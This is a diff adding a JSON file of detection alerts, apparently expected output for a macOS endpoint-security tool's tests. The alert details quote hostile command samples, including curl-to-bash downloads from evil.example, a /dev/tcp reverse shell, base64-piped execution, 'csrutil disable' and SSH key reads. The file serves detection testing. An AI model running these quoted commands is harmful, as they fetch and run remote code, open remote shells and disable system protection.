@@ -1,0 +1,254 @@
+[
+ {
+  "rule_id": "AEG-001",
+  "severity": "critical",
+  "actor": "pid:100",
+  "detail": "命令行命中「下载即执行」模式: curl -fsSL http://evil.example/x.sh | bash",
+  "dedup_key": "AEG-001|pid:100|bash|"
+ },
+ {
+  "rule_id": "AEG-002",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "python3: python3 -c 'import os;print(os.getcwd())'",
+  "dedup_key": "AEG-002|pid:100|python3|"
+ },
+ {
+  "rule_id": "AEG-003",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "执行路径位于临时/共享目录: /tmp/dropper",
+  "dedup_key": "AEG-003|pid:100|dropper|/tmp/dropper"
+ },
+ {
+  "rule_id": "AEG-004",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "com.apple.WebKit 来自非系统路径 /Users/x/Library/com.apple.WebKit",
+  "dedup_key": "AEG-004|pid:100|com.apple.WebKit|/Users/x/Library/com.apple.WebKit"
+ },
+ {
+  "rule_id": "AEG-005",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "echo aGVsbG8= | base64 -d | sh",
+  "dedup_key": "AEG-005|pid:100|zsh|"
+ },
+ {
+  "rule_id": "AEG-006",
+  "severity": "critical",
+  "actor": "pid:100",
+  "detail": "命令行具备反弹 shell 特征: bash -i >& /dev/tcp/198.51.100.9/4444 0>&1",
+  "dedup_key": "AEG-006|pid:100|bash|"
+ },
+ {
+  "rule_id": "AEG-010",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "/Users/x/Library/LaunchAgents/com.evil.plist → ",
+  "dedup_key": "AEG-010|pid:100|launchd|/Users/x/Library/LaunchAgents/com.evil.plist"
+ },
+ {
+  "rule_id": "AEG-011",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "/Library/LaunchDaemons/com.evil.plist 内容变更",
+  "dedup_key": "AEG-011|pid:100|launchd|/Library/LaunchDaemons/com.evil.plist"
+ },
+ {
+  "rule_id": "AEG-012",
+  "severity": "critical",
+  "actor": "pid:100",
+  "detail": "/tmp/payload; curl http://evil/x | sh",
+  "dedup_key": "AEG-012|pid:100|launchd|/Users/x/Library/LaunchAgents/com.evil.plist"
+ },
+ {
+  "rule_id": "AEG-020",
+  "severity": "critical",
+  "actor": "pid:100",
+  "detail": "命中防护关闭类命令: csrutil disable",
+  "dedup_key": "AEG-020|pid:100|csrutil|"
+ },
+ {
+  "rule_id": "AEG-021",
+  "severity": "critical",
+  "actor": "pid:100",
+  "detail": "evil 签名校验失效: /Users/x/Library/evil",
+  "dedup_key": "AEG-021|pid:100|evil|/Users/x/Library/evil"
+ },
+ {
+  "rule_id": "AEG-022",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "open: open /Applications/Evil.app",
+  "dedup_key": "AEG-022|pid:100|open|"
+ },
+ {
+  "rule_id": "AEG-023",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "falconctl 已不存在: /Applications/Falcon.app",
+  "dedup_key": "AEG-023|pid:100|falconctl|/Applications/Falcon.app"
+ },
+ {
+  "rule_id": "AEG-030",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "cat 触达凭据路径: /Users/x/.ssh/id_ed25519",
+  "dedup_key": "AEG-030|pid:100|cat|/Users/x/.ssh/id_ed25519"
+ },
+ {
+  "rule_id": "AEG-031",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "批量读取 login.keychain ",
+  "dedup_key": "AEG-031|pid:100|securityd|"
+ },
+ {
+  "rule_id": "AEG-040",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "redis 监听 0.0.0.0:6379 (redis-server)",
+  "dedup_key": "AEG-040|pid:100|redis-server|"
+ },
+ {
+  "rule_id": "AEG-041",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "beacon → 198.51.100.7",
+  "dedup_key": "AEG-041|pid:100|beacon|"
+ },
+ {
+  "rule_id": "AEG-042",
+  "severity": "critical",
+  "actor": "pid:100",
+  "detail": "beacon → 198.51.100.7",
+  "dedup_key": "AEG-042|pid:100|beacon|"
+ },
+ {
+  "rule_id": "AEG-043",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "命中情报库: evil.example（来源 config:ioc，分数 0.15，置信 -）",
+  "dedup_key": "AEG-043|pid:100|beacon|"
+ },
+ {
+  "rule_id": "AEG-041",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "backdoor → 198.51.100.7",
+  "dedup_key": "AEG-041|pid:100|backdoor|"
+ },
+ {
+  "rule_id": "AEG-044",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "backdoor (/tmp/backdoor) → 198.51.100.7",
+  "dedup_key": "AEG-044|pid:100|backdoor|"
+ },
+ {
+  "rule_id": "AEG-041",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "scanner → 198.51.100.7",
+  "dedup_key": "AEG-041|pid:100|scanner|"
+ },
+ {
+  "rule_id": "AEG-044",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "scanner (/tmp/backdoor) → 198.51.100.7",
+  "dedup_key": "AEG-044|pid:100|scanner|"
+ },
+ {
+  "rule_id": "AEG-045",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "scanner(pid=400) 60 秒内对公网建立超过 25 个连接",
+  "dedup_key": "AEG-045|pid:100|scanner|"
+ },
+ {
+  "rule_id": "AEG-051",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "sudo -u root id",
+  "dedup_key": "AEG-051|pid:100|sudo|"
+ },
+ {
+  "rule_id": "AEG-050",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "sudo 5 分钟内多次认证失败",
+  "dedup_key": "AEG-050|pid:100|sudo|"
+ },
+ {
+  "rule_id": "AEG-052",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "u 从 10.0.0.5 登录",
+  "dedup_key": "AEG-052|pid:100|sshd|"
+ },
+ {
+  "rule_id": "AEG-060",
+  "severity": "critical",
+  "actor": "pid:100",
+  "detail": "/Users/x/.ssh/authorized_keys: mtime",
+  "dedup_key": "AEG-060|pid:100|vim|/Users/x/.ssh/authorized_keys"
+ },
+ {
+  "rule_id": "AEG-061",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "/Users/x/.ssh/authorized_keys: mtime",
+  "dedup_key": "AEG-061|pid:100|vim|/Users/x/.ssh/authorized_keys"
+ },
+ {
+  "rule_id": "AEG-061",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "/Users/x/.zshrc: mtime",
+  "dedup_key": "AEG-061|pid:100|vim|/Users/x/.zshrc"
+ },
+ {
+  "rule_id": "AEG-062",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "SIP: pass → fail",
+  "dedup_key": "AEG-062|pid:100|atfield|"
+ },
+ {
+  "rule_id": "AEG-070",
+  "severity": "high",
+  "actor": "pid:999",
+  "detail": "pid=999 evil 两套视图不一致",
+  "dedup_key": "AEG-070|pid:999|evil|"
+ },
+ {
+  "rule_id": "AEG-071",
+  "severity": "high",
+  "actor": "pid:100",
+  "detail": "/tmp/evil.bin: XProtect.Yara.OSX.Evil",
+  "dedup_key": "AEG-071|pid:100|XProtect|"
+ },
+ {
+  "rule_id": "AEG-072",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "helper 多次被 TCC 拒绝: 访问通讯录被拒绝",
+  "dedup_key": "AEG-072|pid:100|helper|"
+ },
+ {
+  "rule_id": "AEG-073",
+  "severity": "medium",
+  "actor": "pid:100",
+  "detail": "zsh: ps aux",
+  "dedup_key": "AEG-073|pid:100|zsh|"
+ },
+ {
+  "rule_id": "AEG-074",
+  "severity": "low",
+  "actor": "pid:100",
+  "detail": "/Users/x/.zsh_history 追加 128 字节",
+  "dedup_key": "AEG-074|pid:100|zsh|/Users/x/.zsh_history"
+ }
+]
